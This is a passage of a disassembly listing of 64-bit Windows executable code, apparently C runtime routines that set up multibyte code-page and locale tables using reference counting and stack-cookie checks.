   14000902f:	c3                   	ret
   140009030:	40 53                	rex push %rbx
   140009032:	48 83 ec 20          	sub    $0x20,%rsp
   140009036:	e8 7d db ff ff       	call   0x140006bb8
   14000903b:	48 8b d8             	mov    %rax,%rbx
   14000903e:	8b 0d 24 11 01 00    	mov    0x11124(%rip),%ecx        # 0x14001a168
   140009044:	85 88 c8 00 00 00    	test   %ecx,0xc8(%rax)
   14000904a:	74 18                	je     0x140009064
   14000904c:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   140009053:	00 
   140009054:	74 0e                	je     0x140009064
   140009056:	e8 5d db ff ff       	call   0x140006bb8
   14000905b:	48 8b 98 c0 00 00 00 	mov    0xc0(%rax),%rbx
   140009062:	eb 2b                	jmp    0x14000908f
   140009064:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140009069:	e8 42 ee ff ff       	call   0x140007eb0
   14000906e:	90                   	nop
   14000906f:	48 8d 8b c0 00 00 00 	lea    0xc0(%rbx),%rcx
   140009076:	48 8b 15 83 0f 01 00 	mov    0x10f83(%rip),%rdx        # 0x14001a000
   14000907d:	e8 26 00 00 00       	call   0x1400090a8
   140009082:	48 8b d8             	mov    %rax,%rbx
   140009085:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000908a:	e8 11 f0 ff ff       	call   0x1400080a0
   14000908f:	48 85 db             	test   %rbx,%rbx
   140009092:	75 08                	jne    0x14000909c
   140009094:	8d 4b 20             	lea    0x20(%rbx),%ecx
   140009097:	e8 88 de ff ff       	call   0x140006f24
   14000909c:	48 8b c3             	mov    %rbx,%rax
   14000909f:	48 83 c4 20          	add    $0x20,%rsp
   1400090a3:	5b                   	pop    %rbx
   1400090a4:	c3                   	ret
   1400090a5:	cc                   	int3
   1400090a6:	cc                   	int3
   1400090a7:	cc                   	int3
   1400090a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400090ad:	57                   	push   %rdi
   1400090ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400090b2:	48 8b fa             	mov    %rdx,%rdi
   1400090b5:	48 85 d2             	test   %rdx,%rdx
   1400090b8:	74 43                	je     0x1400090fd
   1400090ba:	48 85 c9             	test   %rcx,%rcx
   1400090bd:	74 3e                	je     0x1400090fd
   1400090bf:	48 8b 19             	mov    (%rcx),%rbx
   1400090c2:	48 3b da             	cmp    %rdx,%rbx
   1400090c5:	74 31                	je     0x1400090f8
   1400090c7:	48 89 11             	mov    %rdx,(%rcx)
   1400090ca:	48 8b ca             	mov    %rdx,%rcx
   1400090cd:	e8 96 fc ff ff       	call   0x140008d68
   1400090d2:	48 85 db             	test   %rbx,%rbx
   1400090d5:	74 21                	je     0x1400090f8
   1400090d7:	48 8b cb             	mov    %rbx,%rcx
   1400090da:	e8 ad fe ff ff       	call   0x140008f8c
   1400090df:	83 3b 00             	cmpl   $0x0,(%rbx)
   1400090e2:	75 14                	jne    0x1400090f8
   1400090e4:	48 8d 05 25 0f 01 00 	lea    0x10f25(%rip),%rax        # 0x14001a010
   1400090eb:	48 3b d8             	cmp    %rax,%rbx
   1400090ee:	74 08                	je     0x1400090f8
   1400090f0:	48 8b cb             	mov    %rbx,%rcx
   1400090f3:	e8 fc fc ff ff       	call   0x140008df4
   1400090f8:	48 8b c7             	mov    %rdi,%rax
   1400090fb:	eb 02                	jmp    0x1400090ff
   1400090fd:	33 c0                	xor    %eax,%eax
   1400090ff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009104:	48 83 c4 20          	add    $0x20,%rsp
   140009108:	5f                   	pop    %rdi
   140009109:	c3                   	ret
   14000910a:	cc                   	int3
   14000910b:	cc                   	int3
   14000910c:	48 83 ec 28          	sub    $0x28,%rsp
   140009110:	83 3d 41 2b 01 00 00 	cmpl   $0x0,0x12b41(%rip)        # 0x14001bc58
   140009117:	75 14                	jne    0x14000912d
   140009119:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   14000911e:	e8 c1 03 00 00       	call   0x1400094e4
   140009123:	c7 05 2b 2b 01 00 01 	movl   $0x1,0x12b2b(%rip)        # 0x14001bc58
   14000912a:	00 00 00 
   14000912d:	33 c0                	xor    %eax,%eax
   14000912f:	48 83 c4 28          	add    $0x28,%rsp
   140009133:	c3                   	ret
   140009134:	40 53                	rex push %rbx
   140009136:	48 83 ec 40          	sub    $0x40,%rsp
   14000913a:	8b d9                	mov    %ecx,%ebx
   14000913c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140009141:	33 d2                	xor    %edx,%edx
   140009143:	e8 f4 bd ff ff       	call   0x140004f3c
   140009148:	83 25 e9 29 01 00 00 	andl   $0x0,0x129e9(%rip)        # 0x14001bb38
   14000914f:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140009152:	75 12                	jne    0x140009166
   140009154:	c7 05 da 29 01 00 01 	movl   $0x1,0x129da(%rip)        # 0x14001bb38
   14000915b:	00 00 00 
   14000915e:	ff 15 b4 80 00 00    	call   *0x80b4(%rip)        # 0x140011218
   140009164:	eb 15                	jmp    0x14000917b
   140009166:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140009169:	75 14                	jne    0x14000917f
   14000916b:	c7 05 c3 29 01 00 01 	movl   $0x1,0x129c3(%rip)        # 0x14001bb38
   140009172:	00 00 00 
   140009175:	ff 15 95 80 00 00    	call   *0x8095(%rip)        # 0x140011210
   14000917b:	8b d8                	mov    %eax,%ebx
   14000917d:	eb 17                	jmp    0x140009196
   14000917f:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140009182:	75 12                	jne    0x140009196
   140009184:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140009189:	c7 05 a5 29 01 00 01 	movl   $0x1,0x129a5(%rip)        # 0x14001bb38
   140009190:	00 00 00 
   140009193:	8b 58 04             	mov    0x4(%rax),%ebx
   140009196:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000919b:	74 0c                	je     0x1400091a9
   14000919d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400091a2:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   1400091a9:	8b c3                	mov    %ebx,%eax
   1400091ab:	48 83 c4 40          	add    $0x40,%rsp
   1400091af:	5b                   	pop    %rbx
   1400091b0:	c3                   	ret
   1400091b1:	cc                   	int3
   1400091b2:	cc                   	int3
   1400091b3:	cc                   	int3
   1400091b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400091b9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400091be:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400091c3:	57                   	push   %rdi
   1400091c4:	48 83 ec 20          	sub    $0x20,%rsp
   1400091c8:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   1400091cc:	48 8b f1             	mov    %rcx,%rsi
   1400091cf:	bd 01 01 00 00       	mov    $0x101,%ebp
   1400091d4:	48 8b cb             	mov    %rbx,%rcx
   1400091d7:	44 8b c5             	mov    %ebp,%r8d
   1400091da:	33 d2                	xor    %edx,%edx
   1400091dc:	e8 bf 95 ff ff       	call   0x1400027a0
   1400091e1:	33 c0                	xor    %eax,%eax
   1400091e3:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1400091e7:	48 89 46 04          	mov    %rax,0x4(%rsi)
   1400091eb:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   1400091f2:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400091f7:	0f b7 c0             	movzwl %ax,%eax
   1400091fa:	66 f3 ab             	rep stos %ax,(%rdi)
   1400091fd:	48 8d 3d 0c 08 01 00 	lea    0x1080c(%rip),%rdi        # 0x140019a10
   140009204:	48 2b fe             	sub    %rsi,%rdi
   140009207:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   14000920a:	88 03                	mov    %al,(%rbx)
   14000920c:	48 ff c3             	inc    %rbx
   14000920f:	48 ff cd             	dec    %rbp
   140009212:	75 f3                	jne    0x140009207
   140009214:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   14000921b:	ba 00 01 00 00       	mov    $0x100,%edx
   140009220:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   140009223:	88 01                	mov    %al,(%rcx)
   140009225:	48 ff c1             	inc    %rcx
   140009228:	48 ff ca             	dec    %rdx
   14000922b:	75 f3                	jne    0x140009220
   14000922d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009232:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009237:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000923c:	48 83 c4 20          	add    $0x20,%rsp
   140009240:	5f                   	pop    %rdi
   140009241:	c3                   	ret
   140009242:	cc                   	int3
   140009243:	cc                   	int3
   140009244:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009249:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000924e:	55                   	push   %rbp
   14000924f:	48 8d ac 24 80 fb ff 	lea    -0x480(%rsp),%rbp
   140009256:	ff 
   140009257:	48 81 ec 80 05 00 00 	sub    $0x580,%rsp
   14000925e:	48 8b 05 9b fd 00 00 	mov    0xfd9b(%rip),%rax        # 0x140019000
   140009265:	48 33 c4             	xor    %rsp,%rax
   140009268:	48 89 85 70 04 00 00 	mov    %rax,0x470(%rbp)
   14000926f:	48 8b f9             	mov    %rcx,%rdi
   140009272:	8b 49 04             	mov    0x4(%rcx),%ecx
   140009275:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000927a:	ff 15 a0 7f 00 00    	call   *0x7fa0(%rip)        # 0x140011220
   140009280:	bb 00 01 00 00       	mov    $0x100,%ebx
   140009285:	85 c0                	test   %eax,%eax
   140009287:	0f 84 35 01 00 00    	je     0x1400093c2
   14000928d:	33 c0                	xor    %eax,%eax
   14000928f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140009294:	88 01                	mov    %al,(%rcx)
   140009296:	ff c0                	inc    %eax
   140009298:	48 ff c1             	inc    %rcx
   14000929b:	3b c3                	cmp    %ebx,%eax
   14000929d:	72 f5                	jb     0x140009294
   14000929f:	8a 44 24 56          	mov    0x56(%rsp),%al
   1400092a3:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   1400092a8:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   1400092ad:	eb 22                	jmp    0x1400092d1
   1400092af:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   1400092b4:	0f b6 c8             	movzbl %al,%ecx
   1400092b7:	eb 0d                	jmp    0x1400092c6
   1400092b9:	3b cb                	cmp    %ebx,%ecx
   1400092bb:	73 0e                	jae    0x1400092cb
   1400092bd:	8b c1                	mov    %ecx,%eax
   1400092bf:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   1400092c4:	ff c1                	inc    %ecx
   1400092c6:	41 3b c8             	cmp    %r8d,%ecx
   1400092c9:	76 ee                	jbe    0x1400092b9
   1400092cb:	48 83 c2 02          	add    $0x2,%rdx
   1400092cf:	8a 02                	mov    (%rdx),%al
   1400092d1:	84 c0                	test   %al,%al
   1400092d3:	75 da                	jne    0x1400092af
   1400092d5:	8b 47 04             	mov    0x4(%rdi),%eax
   1400092d8:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   1400092dd:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400092e2:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400092e6:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   1400092ed:	44 8b cb             	mov    %ebx,%r9d
   1400092f0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400092f5:	33 c9                	xor    %ecx,%ecx
   1400092f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400092fc:	e8 d3 2c 00 00       	call   0x14000bfd4
   140009301:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140009306:	8b 47 04             	mov    0x4(%rdi),%eax
   140009309:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140009310:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140009314:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140009318:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   14000931c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140009321:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140009326:	44 8b c3             	mov    %ebx,%r8d
   140009329:	33 c9                	xor    %ecx,%ecx
   14000932b:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   14000932f:	e8 90 2a 00 00       	call   0x14000bdc4
   140009334:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140009339:	8b 47 04             	mov    0x4(%rdi),%eax
   14000933c:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140009343:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140009347:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   14000934e:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140009352:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140009357:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   14000935c:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140009362:	33 c9                	xor    %ecx,%ecx
   140009364:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140009368:	e8 57 2a 00 00       	call   0x14000bdc4
   14000936d:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   140009371:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   140009378:	4c 2b c7             	sub    %rdi,%r8
   14000937b:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   140009382:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   140009386:	4c 2b cf             	sub    %rdi,%r9
   140009389:	f6 02 01             	testb  $0x1,(%rdx)
   14000938c:	74 0a                	je     0x140009398
   14000938e:	80 09 10             	orb    $0x10,(%rcx)
   140009391:	41 8a 44 08 e7       	mov    -0x19(%r8,%rcx,1),%al
   140009396:	eb 0d                	jmp    0x1400093a5
   140009398:	f6 02 02             	testb  $0x2,(%rdx)
   14000939b:	74 10                	je     0x1400093ad
   14000939d:	80 09 20             	orb    $0x20,(%rcx)
   1400093a0:	41 8a 44 09 e7       	mov    -0x19(%r9,%rcx,1),%al
   1400093a5:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   1400093ab:	eb 07                	jmp    0x1400093b4
   1400093ad:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   1400093b4:	48 ff c1             	inc    %rcx
   1400093b7:	48 83 c2 02          	add    $0x2,%rdx
   1400093bb:	48 ff cb             	dec    %rbx
   1400093be:	75 c9                	jne    0x140009389
   1400093c0:	eb 3f                	jmp    0x140009401
   1400093c2:	33 d2                	xor    %edx,%edx
   1400093c4:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   1400093c8:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   1400093cc:	41 8d 40 20          	lea    0x20(%r8),%eax
   1400093d0:	83 f8 19             	cmp    $0x19,%eax
   1400093d3:	77 08                	ja     0x1400093dd
   1400093d5:	80 09 10             	orb    $0x10,(%rcx)
   1400093d8:	8d 42 20             	lea    0x20(%rdx),%eax
   1400093db:	eb 0c                	jmp    0x1400093e9
   1400093dd:	41 83 f8 19          	cmp    $0x19,%r8d
   1400093e1:	77 0e                	ja     0x1400093f1
   1400093e3:	80 09 20             	orb    $0x20,(%rcx)
   1400093e6:	8d 42 e0             	lea    -0x20(%rdx),%eax
   1400093e9:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   1400093ef:	eb 07                	jmp    0x1400093f8
   1400093f1:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   1400093f8:	ff c2                	inc    %edx
   1400093fa:	48 ff c1             	inc    %rcx
   1400093fd:	3b d3                	cmp    %ebx,%edx
   1400093ff:	72 c7                	jb     0x1400093c8
   140009401:	48 8b 8d 70 04 00 00 	mov    0x470(%rbp),%rcx
   140009408:	48 33 cc             	xor    %rsp,%rcx
   14000940b:	e8 30 9e ff ff       	call   0x140003240
   140009410:	4c 8d 9c 24 80 05 00 	lea    0x580(%rsp),%r11
   140009417:	00 
   140009418:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000941c:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140009420:	49 8b e3             	mov    %r11,%rsp
   140009423:	5d                   	pop    %rbp
   140009424:	c3                   	ret
   140009425:	cc                   	int3
   140009426:	cc                   	int3
   140009427:	cc                   	int3
   140009428:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000942d:	57                   	push   %rdi
   14000942e:	48 83 ec 20          	sub    $0x20,%rsp
   140009432:	e8 81 d7 ff ff       	call   0x140006bb8
   140009437:	48 8b f8             	mov    %rax,%rdi
   14000943a:	8b 0d 28 0d 01 00    	mov    0x10d28(%rip),%ecx        # 0x14001a168
   140009440:	85 88 c8 00 00 00    	test   %ecx,0xc8(%rax)
   140009446:	74 13                	je     0x14000945b
   140009448:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   14000944f:	00 
   140009450:	74 09                	je     0x14000945b
   140009452:	48 8b 98 b8 00 00 00 	mov    0xb8(%rax),%rbx
   140009459:	eb 6c                	jmp    0x1400094c7
   14000945b:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140009460:	e8 4b ea ff ff       	call   0x140007eb0
   140009465:	90                   	nop
   140009466:	48 8b 9f b8 00 00 00 	mov    0xb8(%rdi),%rbx
   14000946d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140009472:	48 3b 1d b7 08 01 00 	cmp    0x108b7(%rip),%rbx        # 0x140019d30
   140009479:	74 42                	je     0x1400094bd
   14000947b:	48 85 db             	test   %rbx,%rbx
   14000947e:	74 1b                	je     0x14000949b
   140009480:	f0 ff 0b             	lock decl (%rbx)
   140009483:	75 16                	jne    0x14000949b
   140009485:	48 8d 05 84 05 01 00 	lea    0x10584(%rip),%rax        # 0x140019a10
   14000948c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009491:	48 3b c8             	cmp    %rax,%rcx
   140009494:	74 05                	je     0x14000949b
   140009496:	e8 f9 a2 ff ff       	call   0x140003794
   14000949b:	48 8b 05 8e 08 01 00 	mov    0x1088e(%rip),%rax        # 0x140019d30
   1400094a2:	48 89 87 b8 00 00 00 	mov    %rax,0xb8(%rdi)
   1400094a9:	48 8b 05 80 08 01 00 	mov    0x10880(%rip),%rax        # 0x140019d30
   1400094b0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400094b5:	f0 ff 00             	lock incl (%rax)
   1400094b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400094bd:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400094c2:	e8 d9 eb ff ff       	call   0x1400080a0
   1400094c7:	48 85 db             	test   %rbx,%rbx
   1400094ca:	75 08                	jne    0x1400094d4
   1400094cc:	8d 4b 20             	lea    0x20(%rbx),%ecx
   1400094cf:	e8 50 da ff ff       	call   0x140006f24
   1400094d4:	48 8b c3             	mov    %rbx,%rax
   1400094d7:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400094dc:	48 83 c4 20          	add    $0x20,%rsp
   1400094e0:	5f                   	pop    %rdi
   1400094e1:	c3                   	ret
   1400094e2:	cc                   	int3
   1400094e3:	cc                   	int3
   1400094e4:	48 8b c4             	mov    %rsp,%rax
   1400094e7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400094eb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400094ef:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400094f3:	4c 89 70 20          	mov    %r14,0x20(%rax)
   1400094f7:	41 57                	push   %r15
   1400094f9:	48 83 ec 30          	sub    $0x30,%rsp
   1400094fd:	8b f9                	mov    %ecx,%edi
   1400094ff:	41 83 cf ff          	or     $0xffffffff,%r15d
   140009503:	e8 b0 d6 ff ff       	call   0x140006bb8
   140009508:	48 8b f0             	mov    %rax,%rsi
   14000950b:	e8 18 ff ff ff       	call   0x140009428
   140009510:	48 8b 9e b8 00 00 00 	mov    0xb8(%rsi),%rbx
   140009517:	8b cf                	mov    %edi,%ecx
   140009519:	e8 16 fc ff ff       	call   0x140009134
   14000951e:	44 8b f0             	mov    %eax,%r14d
   140009521:	3b 43 04             	cmp    0x4(%rbx),%eax
   140009524:	0f 84 db 01 00 00    	je     0x140009705
   14000952a:	b9 28 02 00 00       	mov    $0x228,%ecx
   14000952f:	e8 00 de ff ff       	call   0x140007334
   140009534:	48 8b d8             	mov    %rax,%rbx
   140009537:	33 ff                	xor    %edi,%edi
   140009539:	48 85 c0             	test   %rax,%rax
   14000953c:	0f 84 c8 01 00 00    	je     0x14000970a
   140009542:	48 8b 86 b8 00 00 00 	mov    0xb8(%rsi),%rax
   140009549:	48 8b cb             	mov    %rbx,%rcx
   14000954c:	8d 57 04             	lea    0x4(%rdi),%edx
   14000954f:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   140009553:	0f 10 00             	movups (%rax),%xmm0
   140009556:	0f 11 01             	movups %xmm0,(%rcx)
   140009559:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000955d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140009561:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140009565:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140009569:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   14000956d:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140009571:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140009575:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140009579:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   14000957d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140009581:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140009585:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140009589:	49 03 c8             	add    %r8,%rcx
   14000958c:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140009590:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140009594:	49 03 c0             	add    %r8,%rax
   140009597:	48 ff ca             	dec    %rdx
   14000959a:	75 b7                	jne    0x140009553
   14000959c:	0f 10 00             	movups (%rax),%xmm0
   14000959f:	0f 11 01             	movups %xmm0,(%rcx)
   1400095a2:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400095a6:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400095aa:	48 8b 40 20          	mov    0x20(%rax),%rax
   1400095ae:	48 89 41 20          	mov    %rax,0x20(%rcx)
   1400095b2:	89 3b                	mov    %edi,(%rbx)
   1400095b4:	48 8b d3             	mov    %rbx,%rdx
   1400095b7:	41 8b ce             	mov    %r14d,%ecx
   1400095ba:	e8 69 01 00 00       	call   0x140009728
   1400095bf:	44 8b f8             	mov    %eax,%r15d
   1400095c2:	85 c0                	test   %eax,%eax
   1400095c4:	0f 85 15 01 00 00    	jne    0x1400096df
   1400095ca:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   1400095d1:	4c 8d 35 38 04 01 00 	lea    0x10438(%rip),%r14        # 0x140019a10
   1400095d8:	f0 ff 09             	lock decl (%rcx)
   1400095db:	75 11                	jne    0x1400095ee
   1400095dd:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   1400095e4:	49 3b ce             	cmp    %r14,%rcx
   1400095e7:	74 05                	je     0x1400095ee
   1400095e9:	e8 a6 a1 ff ff       	call   0x140003794
   1400095ee:	48 89 9e b8 00 00 00 	mov    %rbx,0xb8(%rsi)
   1400095f5:	f0 ff 03             	lock incl (%rbx)
   1400095f8:	f6 86 c8 00 00 00 02 	testb  $0x2,0xc8(%rsi)
   1400095ff:	0f 85 05 01 00 00    	jne    0x14000970a
   140009605:	f6 05 5c 0b 01 00 01 	testb  $0x1,0x10b5c(%rip)        # 0x14001a168
   14000960c:	0f 85 f8 00 00 00    	jne    0x14000970a
   140009612:	be 0d 00 00 00       	mov    $0xd,%esi
   140009617:	8b ce                	mov    %esi,%ecx
   140009619:	e8 92 e8 ff ff       	call   0x140007eb0
   14000961e:	90                   	nop
   14000961f:	8b 43 04             	mov    0x4(%rbx),%eax
   140009622:	89 05 f0 24 01 00    	mov    %eax,0x124f0(%rip)        # 0x14001bb18
   140009628:	8b 43 08             	mov    0x8(%rbx),%eax
   14000962b:	89 05 eb 24 01 00    	mov    %eax,0x124eb(%rip)        # 0x14001bb1c
   140009631:	48 8b 83 20 02 00 00 	mov    0x220(%rbx),%rax
   140009638:	48 89 05 f1 24 01 00 	mov    %rax,0x124f1(%rip)        # 0x14001bb30
   14000963f:	8b d7                	mov    %edi,%edx
   140009641:	4c 8d 05 b8 69 ff ff 	lea    -0x9648(%rip),%r8        # 0x140000000
   140009648:	89 54 24 20          	mov    %edx,0x20(%rsp)
   14000964c:	83 fa 05             	cmp    $0x5,%edx
   14000964f:	7d 15                	jge    0x140009666
   140009651:	48 63 ca             	movslq %edx,%rcx
   140009654:	0f b7 44 4b 0c       	movzwl 0xc(%rbx,%rcx,2),%eax
   140009659:	66 41 89 84 48 20 bb 	mov    %ax,0x1bb20(%r8,%rcx,2)
   140009660:	01 00 
   140009662:	ff c2                	inc    %edx
   140009664:	eb e2                	jmp    0x140009648
   140009666:	8b d7                	mov    %edi,%edx
   140009668:	89 54 24 20          	mov    %edx,0x20(%rsp)
   14000966c:	81 fa 01 01 00 00    	cmp    $0x101,%edx
   140009672:	7d 13                	jge    0x140009687
   140009674:	48 63 ca             	movslq %edx,%rcx
   140009677:	8a 44 19 18          	mov    0x18(%rcx,%rbx,1),%al
   14000967b:	42 88 84 01 00 98 01 	mov    %al,0x19800(%rcx,%r8,1)
   140009682:	00 
   140009683:	ff c2                	inc    %edx
   140009685:	eb e1                	jmp    0x140009668
   140009687:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000968b:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   140009691:	7d 16                	jge    0x1400096a9
   140009693:	48 63 cf             	movslq %edi,%rcx
   140009696:	8a 84 19 19 01 00 00 	mov    0x119(%rcx,%rbx,1),%al
   14000969d:	42 88 84 01 10 99 01 	mov    %al,0x19910(%rcx,%r8,1)
   1400096a4:	00 
   1400096a5:	ff c7                	inc    %edi
   1400096a7:	eb de                	jmp    0x140009687
   1400096a9:	48 8b 0d 80 06 01 00 	mov    0x10680(%rip),%rcx        # 0x140019d30
   1400096b0:	83 c8 ff             	or     $0xffffffff,%eax
   1400096b3:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400096b7:	ff c8                	dec    %eax
   1400096b9:	75 11                	jne    0x1400096cc
   1400096bb:	48 8b 0d 6e 06 01 00 	mov    0x1066e(%rip),%rcx        # 0x140019d30
   1400096c2:	49 3b ce             	cmp    %r14,%rcx
   1400096c5:	74 05                	je     0x1400096cc
   1400096c7:	e8 c8 a0 ff ff       	call   0x140003794
   1400096cc:	48 89 1d 5d 06 01 00 	mov    %rbx,0x1065d(%rip)        # 0x140019d30
   1400096d3:	f0 ff 03             	lock incl (%rbx)
   1400096d6:	8b ce                	mov    %esi,%ecx
   1400096d8:	e8 c3 e9 ff ff       	call   0x1400080a0
   1400096dd:	eb 2b                	jmp    0x14000970a
   1400096df:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400096e2:	75 26                	jne    0x14000970a
   1400096e4:	4c 8d 35 25 03 01 00 	lea    0x10325(%rip),%r14        # 0x140019a10
   1400096eb:	49 3b de             	cmp    %r14,%rbx
   1400096ee:	74 08                	je     0x1400096f8
   1400096f0:	48 8b cb             	mov    %rbx,%rcx
   1400096f3:	e8 9c a0 ff ff       	call   0x140003794
   1400096f8:	e8 7b ae ff ff       	call   0x140004578
   1400096fd:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009703:	eb 05                	jmp    0x14000970a
   140009705:	33 ff                	xor    %edi,%edi
   140009707:	44 8b ff             	mov    %edi,%r15d
   14000970a:	41 8b c7             	mov    %r15d,%eax
   14000970d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140009712:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140009717:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   14000971c:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140009721:	48 83 c4 30          	add    $0x30,%rsp
   140009725:	41 5f                	pop    %r15
   140009727:	c3                   	ret
   140009728:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000972d:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140009732:	56                   	push   %rsi
   140009733:	57                   	push   %rdi
   140009734:	41 54                	push   %r12
   140009736:	41 56                	push   %r14
   140009738:	41 57                	push   %r15
   14000973a:	48 83 ec 40          	sub    $0x40,%rsp
   14000973e:	48 8b 05 bb f8 00 00 	mov    0xf8bb(%rip),%rax        # 0x140019000
   140009745:	48 33 c4             	xor    %rsp,%rax
   140009748:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000974d:	48 8b da             	mov    %rdx,%rbx
   140009750:	e8 df f9 ff ff       	call   0x140009134
   140009755:	33 f6                	xor    %esi,%esi
   140009757:	8b f8                	mov    %eax,%edi
   140009759:	85 c0                	test   %eax,%eax
   14000975b:	75 0d                	jne    0x14000976a
   14000975d:	48 8b cb             	mov    %rbx,%rcx
   140009760:	e8 4f fa ff ff       	call   0x1400091b4
   140009765:	e9 44 02 00 00       	jmp    0x1400099ae
